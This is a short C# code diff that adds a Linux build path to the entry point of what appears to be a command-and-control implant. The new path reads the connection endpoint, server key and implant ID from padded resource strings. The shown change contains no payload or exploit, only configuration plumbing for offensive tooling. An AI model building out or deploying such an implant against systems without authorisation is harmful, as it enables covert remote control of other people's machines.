@@ -45,9 +45,15 @@ namespace EntryPoint
 
         public static async Task Start()
         {
+#if WINDOWS
             string connUrl = Agent.Properties.Resources.EndPoint;
             string serverKey = Agent.Properties.Resources.Key;
             string implantId = Agent.Properties.Resources.Implant;
+#else
+            string connUrl = AgentLinux.Resource.EndPoint.TrimEnd('*');
+            string serverKey = AgentLinux.Resource.Key.TrimEnd('*');
+            string implantId = AgentLinux.Resource.Implant.TrimEnd('*');
+#endif
 #if DEBUG
             Trace.Listeners.Add(new TextWriterTraceListener(Console.Out));
 #endif
